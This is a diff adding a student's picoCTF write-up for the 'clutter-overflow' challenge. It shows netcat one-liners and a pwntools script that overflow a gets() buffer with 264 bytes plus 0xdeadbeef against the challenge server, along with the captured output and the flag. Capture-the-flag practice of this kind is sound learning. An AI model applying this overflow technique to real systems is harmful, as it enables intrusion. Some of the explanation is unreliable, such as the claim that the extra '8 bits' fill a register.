@@ -128,7 +128,126 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6
 
 
 ***
+# 3. clutter-overflow
+
+> Clutter, clutter everywhere and not a byte to use.
+nc mars.picoctf.net 31890
 
 
+## Solution:
 
+- Examined the source file fr vulnerabilitties and found `gets` which is not a bounded function so is vulnerable t overflow.
+<img width="1280" height="832" alt="Screenshot 2025-10-31 at 7 47 12 PM" src="https://github.com/user-attachments/assets/e6a64ca9-8b73-4a7a-9ccb-cbad3e9fa7fa" />
+
+- From reviewing the code i had an idea of the threshold size as `256` which it was not so used a lot of trial n error to find out `264` as the threshold.
+<img width="1280" height="832" alt="Screenshot 2025-10-31 at 7 56 29 PM" src="https://github.com/user-attachments/assets/304ed65e-3d00-444a-ac5d-870615fc8973" />
+
+- What i understood was that if you overflow the value of `clutter` it appends the value of `code` and to crack the challenge we had to append the value of code to goal which was `deadbeef`
+
+- I first tried using the print function, but for some reason it was not appending it exaclty to the value i wanted.
+
+```
+vishalsharan@Vishals-MacBook-Air ~/Downloads % (python3 -c "print('A'*264 + '\xef\xbe\xad\xde')"; cat) | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0x9ec3adc2bec2afc3
+code != 0xdeadbeef :(
+^C
+
+```
+
+- I asked claude's help for the syntax and tried another approach using write to do the same but this time it was not letting me input the value
+
+```
+vishalsharan@Vishals-MacBook-Air ~/Downloads % (python3 -c "import sys; sys.stdout.buffer.write(b'A'*256 + b'\xef\xbe\xad\xde')"; cat) | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+^C
+
+```
+- I asked looked on yt for this problem and found this script, which uses pwntools, to fill the buffer append the value of `code` to `deadbeef` while connected to the network and obtains the flag.
+
+```
+from pwn import *
+
+fname = './chall'
+
+r = remote('mars.picoctf.net', 31890)
+
+r.sendline(b'A' * 264 + p64(0xdeadbeef))
+
+r.interactive()
+```
+- to run the the program installed the pwntools library 
+
+<img width="1280" height="832" alt="Screenshot 2025-10-31 at 8 07 17 PM" src="https://github.com/user-attachments/assets/4b79a77a-dfeb-4699-9878-9186eb5ef695" />
+
+- Ran the program to obtain the flag.
+
+<img width="1280" height="832" alt="Screenshot 2025-10-31 at 8 07 57 PM" src="https://github.com/user-attachments/assets/b3cd30a0-392e-4eff-8e38-9b5a4c0c6413" />
+
+
+## Flag:
+
+```
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+```
+
+## Concepts learnt:
+
+- Buffer overflow Vulnerability
+- Using the flaws of the `gets` function not being bounded to exploit it.
+- Honeslty I dont fully understand pwntools but employed them to solve this. 
+
+## Notes:
+
+- The reason the threshold was 264 instead of 256 was because when we overflow the buffer we also have to fill the register which is another 8 bits
+- The reason what i believe is for the print function not working is probably the filw was made to be executed in linux
+
+## Resources:
+
+- CluadeAI
+- Gemini
+- https://www.youtube.com/watch?v=1S0aBV-Waeo
+
+
+***
 
